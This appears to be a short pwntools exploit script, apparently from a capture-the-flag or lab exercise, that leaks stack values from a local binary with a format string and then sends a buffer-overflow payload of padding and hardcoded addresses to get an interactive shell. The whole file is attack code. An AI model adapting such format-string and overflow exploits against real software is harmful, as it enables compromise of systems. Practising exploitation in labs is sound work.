from pwn import *
sh = process("./ex3")
sh.send("%p" * 50)
sh.recv()
sh.send("a" * 100 + p32(0xdeadbeef) + p32(0x1815d300) + p32(0x565c90a8) + p32(0x565cb000) + p32(0xff9b1e78) + p32(0x565c823f))
sh.interactive()